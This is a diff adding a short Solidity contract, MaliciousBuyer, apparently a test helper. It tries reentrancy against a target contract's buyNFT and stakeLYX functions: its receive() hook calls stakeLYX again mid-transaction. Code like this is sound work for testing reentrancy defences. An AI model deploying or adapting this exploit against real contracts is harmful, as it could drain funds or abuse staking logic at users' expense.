@@ -1,0 +1,37 @@
+// SPDX-License-Identifier: Apache-2.0
+pragma solidity ^0.8.15;
+
+contract MaliciousBuyer {
+    address private immutable target;
+    bool private attacking;
+    bytes32 private reentrantTokenId;
+
+    constructor(address _target) {
+        target = _target;
+    }
+
+    function attack(bytes32 tokenId) external payable {
+        attacking = true;
+        reentrantTokenId = tokenId;
+        (bool success,) = target.call{value: msg.value}(abi.encodeWithSignature("buyNFT()"));
+        attacking = false;
+        reentrantTokenId = bytes32(0);
+        require(success, "Initial buyNFT call failed");
+    }
+
+    function attackStake(bytes32 tokenId) external payable {
+        attacking = true;
+        reentrantTokenId = tokenId;
+        (bool success,) = target.call{value: msg.value}(abi.encodeWithSignature("stakeLYX(bytes32)", tokenId));
+        attacking = false;
+        reentrantTokenId = bytes32(0);
+        require(success, "Initial stakeLYX call failed");
+    }
+
+    receive() external payable {
+        if (attacking && reentrantTokenId != bytes32(0)) {
+            (bool successStake,) = target.call{value: msg.value}(abi.encodeWithSignature("stakeLYX(bytes32)", reentrantTokenId));
+            successStake; // Silence warning
+        }
+    }
+}
